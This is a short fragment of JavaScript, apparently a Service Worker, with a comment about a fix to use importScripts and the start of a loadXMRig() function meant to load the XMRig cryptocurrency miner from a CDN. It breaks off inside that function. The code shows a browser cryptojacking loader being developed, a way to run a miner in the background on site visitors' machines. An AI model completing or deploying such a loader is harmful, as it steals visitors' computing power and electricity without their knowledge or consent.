...
// Fixed: uses importScripts instead of dynamic import().
// ============================================================
...
// ---------- Load XMRig from CDN (using importScripts) ----------
function loadXMRig() {
  try {
    // importScripts is the correct way to load external scripts in a Service Worker
